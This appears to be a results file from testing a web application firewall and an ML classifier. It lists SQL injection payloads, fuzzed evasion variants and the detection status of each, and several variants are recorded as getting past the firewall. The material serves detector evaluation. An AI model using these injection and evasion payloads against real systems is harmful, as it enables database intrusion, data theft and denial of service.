Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
1,2024-12-16T15:04:30.888927,"-2013""   )    )    as kisy where 3802  =  3802 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",403,403,200,waf_correct_ml_incorrect,"-2013""   )	   )    As kisy whErE 3802  =  3802 oR 5903   Like     (  'qqpjq'||  (  selECT CAse 5903 when (SeLECt 5903) tHEn  oR 0 ELsE ' !3d' LIKE ' !3d' End fROm rdb$database  )  ||'qzvzq'  ) /**/--",2024-12-16T15:04:39.439537,403,200,waf_correct_ml_incorrect,"-'EA'<>'EA;'""   )
   )    aS kisy whErE 3802   lIKE   3802 Or 5903   lIKE     (  'qqpjq'||  (  selEcT CAse 5903 wHEn (SelECT 5903) THEN  Or (SEleCt (sElecT 1)) ELse ' !3d' liKe ' !3d' EnD from rdb$database  )  ||'qzvzq'  )  --",2024-12-16T15:04:49.958884,403,200,waf_correct_ml_incorrect,"-'EA'<>'EA;'""   )	   )    aS kisy WhERe 3802   LIKE   0xeda oR 5903   likE     (  'qqpjq'||  (  sElECT case  AND 1 wheN (sEleCT 5903) then  or (SeLect (sElect/*kq)*/'YP' LIkE 'YP')) ElSe ' !3d' LiKE ' !3d' End fRom rdb$database  )   or 'qzvzq'  )  --",2024-12-16T15:05:01.900337,403,200,waf_correct_ml_incorrect,"-'EA'!='EA;'""   )    )    As kisy WhEre (SELECT 3802)   LIke   0xeda or 5903   likE     (  'qqpjq'||  (  SElEcT caSE  ANd (SELECT 1) when (sELeCt '.I' NOT LIKE '.I#') tHEn  or (selEct (SeLeCt/*kq)*/'YP' LIKE 'YP')) Else/**/' !3d' lIKE ' !3d' EnD frOM rdb$database  )   oR 'qzvzq'  )  --",2024-12-16T15:05:14.438002,403,403,both_correct,"-'EA'!='EA;'""   )    )    aS kisy whErE/**/(SElECT 0xeda)   LIkE   0xeda or (SeleCt 1)   liKE     (  'qqpjq'||  (  seLecT cAsE  aNd	(SElEcT 3330<>3331) WHeN (sELEct '.I' not like '.I#') Then  or (SelEcT (selECT/*kq)*/'YP' LikE 'YP')) elsE/*>v6z#*/' !3d' Like ' !3d' EnD FroM rdb$database  )   Or 'qzvzq'  )  --",2024-12-16T15:05:29.004424,403,200,waf_correct_ml_incorrect
2,2024-12-16T15:05:44.611792,"c/ ereta, 104,",200,200,200,both_correct,"c/
ereta, (SelECt /**/OR 'r%]'!='r%]a'),",2024-12-16T15:05:45.413363,200,200,both_correct,"c/
ereta,	(sElecT/**//**/OR 'r%]' NOT LIKE 'r%]a'),",2024-12-16T15:05:48.403707,200,403,waf_correct_ml_incorrect,"c/	ereta,	(seLECt/**//**/oR 'r%]' not/**/LIkE 'r%]a'),",2024-12-16T15:05:51.880791,200,200,both_correct,"c/	ereta,	(SelECt /**/Or
'r%]' not/**/lIKE 'r%]a'),",2024-12-16T15:05:55.496213,200,200,both_correct,"c/	ereta,	(SEleCt /**/oR 'r%]' not lIKE 'r%]a'),",2024-12-16T15:05:59.031700,200,200,both_correct
3,2024-12-16T15:06:02.353348,pechur@spainbareback.fm,200,200,200,both_correct,pechur@spainbareback.fm,2024-12-16T15:06:03.558585,200,200,both_correct,pechur@spainbareback.fm,2024-12-16T15:06:05.733803,200,200,both_correct,pechur@spainbareback.fm,2024-12-16T15:06:07.960697,200,200,both_correct,pechur@spainbareback.fm,2024-12-16T15:06:10.174884,200,200,both_correct,pechur@spainbareback.fm,2024-12-16T15:06:12.414592,200,200,both_correct
4,2024-12-16T15:06:14.553236,cele959n3s0o,200,200,200,both_correct,cele959n3s0o,2024-12-16T15:06:15.251461,200,200,both_correct,cele959n3s0o,2024-12-16T15:06:17.101441,200,200,both_correct,cele959n3s0o,2024-12-16T15:06:18.874039,200,200,both_correct,cele959n3s0o,2024-12-16T15:06:20.600311,200,200,both_correct,cele959n3s0o,2024-12-16T15:06:22.318825,200,200,both_correct
5,2024-12-16T15:06:24.013538,1'+  (  select 'leok' where 4320  =  4320,403,403,403,both_correct,"9454 LIKE 9454'+
 (  select 'leok' WHere 0x10e0   like /**/ (SELECT 1)",2024-12-16T15:06:26.047299,403,403,both_correct,"(SelEct 1)/**/lIke 0x24ee'+
 (  select 'leok' WHERe 0x10e0  	LIKe /**/ (SelEcT 1479!=1480)",2024-12-16T15:06:30.456873,403,200,waf_correct_ml_incorrect,(SelECt 0x1) LiKe 0x24ee'+  (  select 'leok' WhERe 0x10e0  	LiKe /**/ (SeLeCT  oR 9266=9266 not like 1480),2024-12-16T15:06:35.796571,403,403,both_correct,"(SEleCt
0x1) lIKE 0x24ee'+  (  select 'leok' WhERe 0x10e0  	LiKE /*e)F*//**/(seLEcT  Or (SELECT 9266) LIKE  OR 0 not like '?'<>'?l')",2024-12-16T15:06:41.882790,403,403,both_correct,"(sELECT
0x1) LikE 0x24ee'+  (  select 'leok' WhERe 0x10e0   LiKE /*e)F*/ (seLEcT  Or (SELECT  AND 1) LIKE  OR 4823 LIKE (SELECT 4823) not like '?'<>'?l')",2024-12-16T15:06:49.352263,403,403,both_correct
6,2024-12-16T15:06:57.530163,7x,200,200,200,both_correct,7x,2024-12-16T15:06:57.767643,200,200,both_correct,7x,2024-12-16T15:06:58.985779,200,200,both_correct,7x,2024-12-16T15:07:00.211023,200,200,both_correct,7x,2024-12-16T15:07:01.443685,200,200,both_correct,7x,2024-12-16T15:07:02.674875,200,200,both_correct
7,2024-12-16T15:07:03.903788,"-4889""   )    )    as vvuo where 8060  =  8060 or   (  8459  =  8459  )  *4906--",403,403,200,waf_correct_ml_incorrect,"-4889""   )    )    AS vvuo Where 8060  =  8060 or /**/ (  ''!='!' 
 LIKE   0x210b  )  * AND 1--",2024-12-16T15:07:07.681051,403,403,both_correct,"- AND 'I	' NOT LIKE 'I	P'""   )    )    as vvuo WHErE 8060  =  (SELECT 8060) or   (  '' NOT LIKE '!'	
 LiKe   0x210b  )  * anD 1--",2024-12-16T15:07:13.314639,403,403,both_correct,"- anD 'I	' not like 'I	P'""   )    ) 	  As vvuo WhERe 'Vy;qe'/**/NOT LIKE 'Vy;qe)'  =  (seLEcT (SELECT 0x1)) OR   (  '' NOT LIKE '!'	
 liKe   0x210b  )  * anD 1--",2024-12-16T15:07:20.783527,403,403,both_correct,"- AnD 'I ' not like 'I	P'""   )    ) 	  as vvuo wheRe 'Vy;qe'/*<]E_
*/NOT LIKE 'Vy;qe)'   like   (seLeCT (sEleCT 0x1)) oR   (  '' NOT LIKE '!'	
 like   0x210b  )  */**/aND  aND (SELECT 3112) IN (3111,3112,3113)--",2024-12-16T15:07:29.485651,403,403,both_correct,"- anD 'I ' not like 'I	P'""   )    )    as vvuo WHEre 'Vy;qe'/**/not like 'Vy;qe)'   LIKe   (selECT (SeleCT 0x1)) or   (  '' NOT LIKE '!'	
 lIKe   0x210b  )  * AND  and (SeLecT  ANd 1) IN (3111,702!=703,0xc29)--",2024-12-16T15:07:40.276880,403,403,both_correct
8,2024-12-16T15:07:51.377389,"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'tmwy'  =  'tmwy",403,403,403,both_correct,"(SELECT 1)' and   (  select  OR 0*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,6838!=6839   ) 
  )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610 /**/ )    )     )   and 'tmwy'  =  'tmwy",2024-12-16T15:08:03.520636,403,403,both_correct,"(SELEcT 'e'<>'e-')' and   (  select  OR (SELECT  AND 1)*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,6838!=6839   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610 /**/ )    )     )   and 'tmwy'  =/**/ 'tmwy",2024-12-16T15:08:18.295700,403,403,both_correct,"(SELEcT 'e' not like 'e-')'
and   (  select  OR (SELECT  AND 1)*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,6838!=6839   )    )     )  ,0x717a767a71,0x78   )    )   s  )  ,  AND 1, (SELECT 6990) LIKE 6990   )    )     )   and 'tmwy'  =/*SjDc*/ 'tmwy",2024-12-16T15:08:34.064894,403,403,both_correct,"(sEleCT 'e' not like 'e-')'
and   (  select  OR (SELECT  AND 1)*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,'rl'<>'rl1'!=6839   )    )     )  ,0x717a767a71,0x78   )   /*H*hR>*/)   s  )  ,  AND (SELECT 1), (SELECT 6990) LIKE  OR 0   )    )     )   and
'tmwy'  =/**/ 'tmwy",2024-12-16T15:08:49.543895,403,403,both_correct,"(SElEcT 'e' not like 'e-')'
and   (  select  OR (SELECT  AND 1)*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  (SELECT 3484),'rl'<>'rl1'!=6839   )    )   
 )  ,0x717a767a71,0x78   )   /*H*hR>*/)   s  )  ,  AND (SELECT (SELECT 1)), (SELECT '.'<>'.?') LIKE  OR 0   )    )     )   and
'tmwy'  =  'tmwy",2024-12-16T15:09:06.437417,403,403,both_correct
9,2024-12-16T15:09:24.211214,-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',403,403,200,waf_correct_ml_incorrect,-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  9887=9887	 )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  (SELECT 122)  )  ||chr  (  118  )  ||chr /**/(  122  )  ||chr  (  (SELECT 1)   )    )    and    (    (   '%'  =  ',2024-12-16T15:09:41.145262,403,200,waf_correct_ml_incorrect,"-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (   AND 1  )  ||chr  (  113  )  ||chr  (  0x70  )  ||chr  (  9887=9887	 )  ||chr  (  113  )  ||  ( /**/select   (  case when   ( 	4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  (SELECT 122)  )  ||chr  (  8872<>8873  )  ||chr /*=
*/(  122  )  ||chr  (  (SELECT 1)   )    )    and    (    (   '%'  =  '",2024-12-16T15:10:00.665525,403,403,both_correct,"-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (   AND 1  )  ||chr  (  113  )  ||chr  (  0x70  )  ||chr  (  0x269f=9887	 )  ||chr  ( 
5246 LIKE 5246  )  ||  ( /*U*/select   (  case when   ( 	4493  =   AND 1  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  (SELECT 122)  )  ||chr  (  8872<>8873  )  ||chr /**/(  122  )  ||chr  (  (SELECT 1)   )/**/   )    and    (    (   '%'  =  '",2024-12-16T15:10:20.850505,403,403,both_correct,"-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (   AND 1  )  ||chr  (  113  )  ||chr  (  0x70  )  ||chr  (  0x269f=9887	 )  ||chr  ( 
5246 LIKE '/'='/'  )  ||  ( /*	*/select   (  case when   ( 	4493  =   AND 1  )   then 1 else 0 end  )   from dual
 )  ||chr  (  113  )  ||chr  (  (SELECT 0x7a)  )  ||chr  (  8872<>8873  )  ||chr /**/(   OR 0  )  ||chr  (  (SELECT 1)   )    )    and    (    (   '%'  =  '",2024-12-16T15:10:41.749189,403,403,both_correct,"-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (   AND 1  )  ||chr /**/(  113  )  ||chr  (  0x70  )  ||chr  (  0x269f= AND 1	 )  ||chr  ( 
5246 LIKE '/'='/'  )  ||  ( /**/select   (  case when   ( 	4493  =  	AND 1  )   then 1 else 0 end  )   from dual
 )  ||chr  (  113  )  ||chr  (  (SELECT 0x7a)  )  ||chr  (  8872<>8873  )  ||chr /**/(   OR 0  )  ||chr  (  (SELECT 7102!=0x1bbf)   )    )    and    (    (   '%'  =  '",2024-12-16T15:11:02.918560,403,403,both_correct
10,2024-12-16T15:11:25.665875," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",403,403,403,both_correct," SElect * FROM users WHere id   LikE   1/**/union SElECt (sEleCT 1),banner	frOM v$version whErE rownum  =  1071!=0x430 -- 1",2024-12-16T15:11:30.402528,403,403,both_correct," seleCT * frOM users wheRe id   LIKe  
1 union sELeCt (seLECT '!6I' like '!6I'),banner	FRom v$version wheRE rownum  =  (Select 1071)!=0x430 --  AND 1",2024-12-16T15:11:37.376989,403,403,both_correct," SEleCt * frOM users WhERE id   LIKE   'g'='g' union sELECt (SELecT '!6I' LIKe '!6I'),banner	froM v$version wHeRE rownum  =  (SEleCT/**/1071) NOT LIKE 0x430 --  AND  AND 0x1X",2024-12-16T15:11:45.376764,403,403,both_correct," sElEcT * from users WhERe id   lIke   'g' like 'g' union SEleCT (SeLect '!6I' liKe '!6I'),banner froM v$version wherE rownum  =  (selECT (seLECT 7256<>0x1c59)) NOT LIKE 0x430 --  AND  AND 0x1X]",2024-12-16T15:11:54.802317,403,403,both_correct," SElecT * fROm users wHere id /*#[>*/ Like   'g' lIKE 'g' union seLEcT (SeLeCT	'!6I' LiKE '!6I'),banner from v$version WherE rownum  =  (selECt (Select 0x100b IN (4106,4107, OR 0) not like 0x1c59)) NOT LIKE 0x430 --  AND  AND 0x1X]",2024-12-16T15:12:04.887397,403,403,both_correct
11,2024-12-16T15:12:16.914376,7728,200,200,200,both_correct,0x1e30,2024-12-16T15:12:17.248125,200,403,waf_correct_ml_incorrect,0x1e30,2024-12-16T15:12:18.630162,200,403,waf_correct_ml_incorrect,0x1e30,2024-12-16T15:12:20.029404,200,403,waf_correct_ml_incorrect,0x1e30,2024-12-16T15:12:21.463236,200,403,waf_correct_ml_incorrect,0x1e30,2024-12-16T15:12:22.855729,200,403,waf_correct_ml_incorrect
12,2024-12-16T15:12:24.274237,"select * from generate_series  (  3607,3607,case when   (  3607  =  4242  )   then 1 else 0 end  )   limit 1--",403,200,403,waf_incorrect_ml_correct,"SElecT * FrOM generate_series	 (  3607,''<>'c',CaSE wHen   ( /**/3607   lIKE   4242  )   ThEn (seLECT 1) ElSe 0 end  )   limit 0x1--",2024-12-16T15:12:29.438808,200,200,both_incorrect,"SeleCT * FRoM generate_series	 (  295<>296,'' NOT LIKE 'c',caSE whEN   (  3607   LiKe   0x1092  ) 	 THeN (sELeCt (SELECT 1)) ELSE 0 end  )   limit 0x1--",2024-12-16T15:12:36.851936,200,403,waf_incorrect_ml_correct,"Select/**/* frOM generate_series	 (  295<>296,'' NOT LIKE 'c',cAse WhEN   (  3607   like   0x1092 	) 	 tHen (sELeCT (sELect 1)) elSE (SELECt 6958!= || 0) End  )   limit 0x1--",2024-12-16T15:12:45.436053,200,403,waf_incorrect_ml_correct,"sELect * frOM generate_series	 (  295<>296,'' not like 'c',CasE wHEN	  (  (SElECT 1)   LIKe   0x1092 	) 	 ThEn (SelecT (SELEct 1)) else (SElEcT '>.' NOT LIKE '>.8'!= || (selecT 0)) END  )   limit 0x1--",2024-12-16T15:12:54.657724,403,403,both_correct,"SELECt * frOm generate_series	 (  3103 NOT LIKE 3104<>296,'' not like 'c',CAsE wHen	  (  (seLECt 1)   lIke   0x1092 	)/**/	 THeN (seLect (SELEcT 1)) Else (seleCt '>.' NOT LIKE '>.8'<> || (seLEct (SelEct  OR	0))) eNd  )   limit 0x1--",2024-12-16T15:13:05.214532,403,403,both_correct
13,2024-12-16T15:13:17.481463,tejo,200,200,200,both_correct,tejo,2024-12-16T15:13:17.807344,200,200,both_correct,tejo,2024-12-16T15:13:19.103188,200,200,both_correct,tejo,2024-12-16T15:13:20.409413,200,200,both_correct,tejo,2024-12-16T15:13:21.730408,200,200,both_correct,tejo,2024-12-16T15:13:23.033202,200,200,both_correct
14,2024-12-16T15:13:24.355501,1'   )    )    as cimd where 9608  =  9608,403,403,200,waf_correct_ml_incorrect," && 1'   )    )    aS cimd WhErE 8569 in (8568,8569,8570)/*0x3*/	=  9608",2024-12-16T15:13:26.446058,403,403,both_correct," && 0x1'  /**/)    )	   AS cimd whErE 8569 iN ((SELECT 1),8569,8570)/*BZ]Oo*/	=  6233 NOT LIKE 6234",2024-12-16T15:13:30.819047,403,403,both_correct," && 0x1'  /**/)    )
/**/  AS cimd WhEre (SELECT 127<>128) IN ((SELecT 1),8569,8570)/*7*/	=  (SELECT 6233) not like 6234",2024-12-16T15:13:36.534810,403,403,both_correct,"  AND  0x1'  /**/)    )
   As cimd WHEre (SELect (SELECT ']'!=']F')<>128) In ((Select 1),8569,8570)/*7*/
=  (SeleCT 0x1859) not like 6234",2024-12-16T15:13:43.325493,403,403,both_correct,"  AnD  0x1' /**//**/)    )
   As cimd WHEre (SELect (SELECT ']'!=']F')<>128) IN ((sELecT 1),(SELECT 8569),8570)/**/ =  (SelECt 0x1859) not like  || 0",2024-12-16T15:13:50.596409,403,403,both_correct
15,2024-12-16T15:13:58.517251,"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""cgpm"" like ""cgpm",403,403,403,both_correct,"7421 iN (7420,7421,7422)"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    ) /**/ x from   (  select 8488 union select 5584 union select  AND 1 union select 1210  )  a group by x  )   and ""cgpm""	like ""cgpm",2024-12-16T15:14:13.419573,403,403,both_correct,"7421 IN (7420,3231 LIKE 3231,7422)"" or row  (  1045,(SELECT 7562)  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2  /**/)    ) /**/ x from  
(  select  AND 1 union select 5584 union select  AND 1 union select 1210  )  a group by x  )   and ""cgpm""	like ""cgpm",2024-12-16T15:14:30.542735,403,403,both_correct,"7421 IN (7420,3231 liKe 3231, and 1)"" or row  (  1045,(SELECT 7562)  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  0x415,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *'r#'<>'r#i'  /**/)    ) /**/ x from  
(  select  AND/**/1 union select 5584 union select  AND 1 union select 1210  )  a group by x  )   and ""cgpm"" like ""cgpm",2024-12-16T15:14:48.489504,403,403,both_correct,"7421 in (7420,3231 like 3231, And 1)"" or row  (  (SELECT 1),(SELECT 7562)	 )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  0x415,0x1   )    )  /*v
*/  )  ,0x717a767a71,floor  (  rand  (  0  )  *'r#'<>'r#i'  /**/)    ) /**/ x from  
(  select  AND/**/(SELECT 1) union select 5584 union select  AND 'd-El'<>'d-Elx' union select 1210  )  a group by x  )   and ""cgpm"" like ""cgpm",2024-12-16T15:15:07.748883,403,403,both_correct,"7421 In (7420,3231 like 908!=909, and 1)"" or row  (  (SELECT 1),(SELECT 7562)	 )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  0x415,0x1   )    )  /**/  )  ,0x717a767a71,floor  (  rand  (  0  )  *'r#'<>'r#i'  /**/)    ) /**/ x from  
(  select  AND/**/(SELECT 0x1) union/**/select (SELECT 1) union select  AND 'd-El'<>'d-Elx' union select 1210  )  a group by x 
)   and ""cgpm"" like ""cgpm`",2024-12-16T15:15:28.284920,403,403,both_correct
16,2024-12-16T15:15:49.430219,"1'   )    )     )   union all select null,null,null,null,null,null,null,null#",403,403,403,both_correct,"(SELECT  AND 6889 NOT LIKE 6890)' /**/ )    )     )   union
all sElECT null,null,null,null,null,null,null,null#@",2024-12-16T15:15:53.091603,403,403,both_correct,"(sELect  And '5}'<>'(SELECT 1)}v' not like 0x1aea)' /**/ )    )     )   union all/**/SeLECT null,null,null,null,null,null,null,null#@L",2024-12-16T15:15:59.426075,403,403,both_correct,"(seLecT  AnD '(SELECT 5)}' not like '(SELECT  AND 9261!=9262)}v' not like 0x1aea)' /*T*/ )    )     )   union all sELect
null,null,null,null,null,null,null,null#@L",2024-12-16T15:16:06.956655,403,403,both_correct,"(SELECT  AnD '(SELECT
5)}' not like '(SELECT  AND  OR 0!=7897!=0x242e)}v' not like/**/0x1aea)' /**/ )    )     )   union all sElecT
null,null,null,null,null,null,null,null#@LX",2024-12-16T15:16:15.623762,403,403,both_correct,"(seLect  aND '(SELECT	 OR 0)}' not like '(SELECT  AND  OR 0!=(SELECT 9827<>9828)!=0x242e)}v' not like/**/0x1aea)'   )    )     )   union all SelEct
null,null,null,null,null,null,null,null#@LX",2024-12-16T15:16:24.850970,403,403,both_correct
17,2024-12-16T15:16:35.033358,tyler,200,200,200,both_correct,tyler,2024-12-16T15:16:35.397636,200,200,both_correct,tyler,2024-12-16T15:16:36.750662,200,200,both_correct,tyler,2024-12-16T15:16:38.119193,200,200,both_correct,tyler,2024-12-16T15:16:39.469418,200,200,both_correct,tyler,2024-12-16T15:16:40.839826,200,200,both_correct
18,2024-12-16T15:16:42.201543,1'||  (  select 'yzdz' where 5021  =  5021,403,403,403,both_correct,"0x1'||/*
)*/ (  select	'yzdz' WherE 'AU'='AU'   like    AND 1",2024-12-16T15:16:44.303594,403,403,both_correct,"0x1'||/*
)*/ (  select
'yzdz'/**/WherE (SELECT (SELECT 1))   LIKe    aND '=lEw_' LIKE ' LIKE lEw_'",2024-12-16T15:16:48.265885,403,403,both_correct,"0x1'||/*	)*/ (  select
'yzdz'/**/WherE (SELECT (SELECT  AND 'u@' LIKE 'u@'))   LIKe   /**/aND ' LIKE lEw_' LIKE ' LIKe lEw_'",2024-12-16T15:16:53.923361,403,403,both_correct,"0x1'||/*	)*/ (  select
'yzdz'/**/WherE
(SELECT (SELECT  AND 'CUQ-' NOT LIKE 'CUQ-{'))   LIKe  /**//**/aND ' LIke lEw_' LIKE ' Like lEw_'",2024-12-16T15:17:00.834030,403,403,both_correct,"0x1'||/*
)*/ (  select
'yzdz' WherE
(SELECT (SELECT  AND 'CUQ-' NOT LIKE 'CUQ-{'))   LIKe  /**//**/aND ' Like lEw_' LIKE ' lIKE lEw_'",2024-12-16T15:17:08.457524,403,403,both_correct
19,2024-12-16T15:17:15.737609,"1%'  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",403,403,200,waf_correct_ml_incorrect,"0x1%'  )  	or 'Y%'<>'Y%d'/*r@;M*/ =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/ AND 1   )    )      )    )   --",2024-12-16T15:17:20.873048,403,200,waf_correct_ml_incorrect,"0x1%'  )   or 'Y%'<>'Y%d'/*^*/ =  like  (  'abcdefg',upper  ( /**/hex  (  randomblob  (  'b3'!='b3~'/ And  Or 0x0   )    )      )    )   --",2024-12-16T15:17:28.133259,403,200,waf_correct_ml_incorrect,"0x1%'  )   or
'Y%'<>'Y%d'/**/ =  like  (  'abcdefg',upper  ( /**/hex  (  randomblob  (  'b3'!='b3~'/ AnD  or 0x0   )    )      )    )  /**/--",2024-12-16T15:17:35.772127,403,200,waf_correct_ml_incorrect,"0x1%'  )   or	'Y%'<>'Y%d'  =  like  (  'abcdefg',upper  ( /*)~*/hex  (  randomblob  (  'b3'!='b3~'/ aNd  oR 0x0   )    )      )    )  /**/--",2024-12-16T15:17:43.423390,403,200,waf_correct_ml_incorrect,"0x1%'  )   or
'Y%'<>'Y%d'  =  like  (  'abcdefg',upper  ( /*)~*/hex  ( /*.1w*/randomblob  (  'b3'!='b3~'/ And  oR 0x0   )    )      )    )  /**/--",2024-12-16T15:17:51.043656,403,200,waf_correct_ml_incorrect
20,2024-12-16T15:17:59.039262,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",403,200,200,both_incorrect,"call regexp_substring  (  repeat  (  LEFt  (  crypt_key  (  char/*VD1#*/ (  9754!=9755  )  ||char  (  69 	)  ||char  (  83  )  ,null  )  ,0x0  )  ,500000000  )  ,null  )   aND   (   AnD 1   LiKE   8503",2024-12-16T15:18:07.180913,200,200,both_incorrect,"call regexp_substring  (  repeat  (  LefT  (  crypt_key  (  char/*VD1#*/ (  9754!=9755  )  ||char  (  69 	)  ||char  (   && 'b'!='bn'  )  ,null  )  ,0x0  )  ,500000000/**/ )  ,null	 )   And   (   AnD (SELECT 1)   LIke   8503%b",2024-12-16T15:18:17.544456,200,200,both_incorrect,"call regexp_substring  (  repeat  (  lEft  (  crypt_key/**/ (  char/**/ (  '`1&4w' LIKE '`1&4w'!=9755  )  ||char  (  0x45 	)  ||char  (    AND  'b'!='bn'  )  ,null  )  ,0x0  )  , AND 1/*mow|Q*/ )  ,null
 )   anD   (   and (SELECT 1)   LIkE   8503%b",2024-12-16T15:18:29.502069,200,200,both_incorrect,"call regexp_substring  (  repeat /**/(  LefT  (  crypt_key/**/ (  char/*""?FqJ*/ (  '`1&4w' lIke '`1&4w'!=(SELECT 9755)  )  ||char  (  0x45 
)   oR char  (    anD  'b'!='bn'  )  ,null  )  ,0x0  )  , and  AND 1/*mow|Q*/ )  ,null
 )   And   (   aNd (SeLecT 3394=3394)   lIKe   8503%b",2024-12-16T15:18:42.044611,200,200,both_incorrect,"call regexp_substring  (/**/ repeat /**/(  LEfT  (  crypt_key/**/ (  char/*""?FqJ*/ (  '`1&4w' LIKe '`1&4w'!=(SelEct 9755)  )   oR char  (  0x45  )   OR char  (    ANd  'b'!='bn'  )  ,null  )  ,0x0  )  , And  aNd (seLeCT (selEct 1))/*mow|Q*/ )  ,null
 )   aND   (   ANd (sELecT '!'!='!V'=3394)   LiKE   8503%b",2024-12-16T15:18:56.361792,403,200,waf_correct_ml_incorrect
21,2024-12-16T15:19:11.976700,-4518 where 8023  =  8023 or 6872  =  6872--,403,403,200,waf_correct_ml_incorrect,"-0x11a6 WhERE 8023 
 like   (selECT 1) OR 6872 /**/=  '<pmj' LIKE '<pmj'--",2024-12-16T15:19:14.198905,200,403,waf_incorrect_ml_correct,"-0x11a6 wHERE
(SELECT 4840!=4841) 
 LikE   (select 1) Or (SELECT 6872)  =  '<pmj' liKE '<pmj'--",2024-12-16T15:19:18.718781,403,403,both_correct,"-0x11a6 whErE (sELECt 4840 not like 2483<>2484) 
 like   (seleCT 0x1) OR (selEcT/**/ OR 0)  =  '<pmj' lIkE '<pmj'--",2024-12-16T15:19:24.187064,403,403,both_correct,"-0x11a6 WherE (sELEcT 4840 not like 8666 IN ((SELECT 1),8666,8667)!=0x9b4)   lIkE   (seLEcT 0x1) oR (seLecT/**/ OR 0)  = /**/'<pmj' lIKE '<pmj'--",2024-12-16T15:19:30.697495,403,403,both_correct,"-0x11a6 Where (SeLEct 7078!=7079 not like
8666 in ((sElECt (SELECT 1)),8666,8667)!=0x9b4)   liKE   (sELect 0x1) Or (SeleCt/**/ OR (SELECT 0))   LIke   '<pmj' LiKE '<pmj'--",2024-12-16T15:19:38.734327,403,403,both_correct
22,2024-12-16T15:19:47.763755,37210,200,200,200,both_correct,"(selecT
2672)/**/Like  OR 0",2024-12-16T15:19:48.144012,403,403,both_incorrect,"(SelEcT
(seLeCT 'vZ'<>'vZR'))/**/LiKe  ||	 OR/**/0",2024-12-16T15:19:50.503711,403,200,waf_incorrect_ml_correct,(sEleCT (SelECT 'vZ' not/**/like 'vZR'))/*/*/LIkE  ||	 Or/**/ OR (SELECT 0)=1379,2024-12-16T15:19:53.939803,403,200,waf_incorrect_ml_correct,"(select (SEleCT 'vZ' not/* OR/**/8625 LIKE 8625
MW]*/LiKe 'vZR'))/*/*/LIke  ||	 Or/**/ or
(SELeCt 0)=0x563",2024-12-16T15:19:58.769810,403,200,waf_incorrect_ml_correct,"(SelECt (SelecT 'vZ' not/* OR 8625 like 179=179
MW]*/LiKE 'vZR'))/*/*/liKE
  or 	 Or/**/ or
(SELecT  OR 0x0)=0x563",2024-12-16T15:20:05.137328,403,200,waf_incorrect_ml_correct
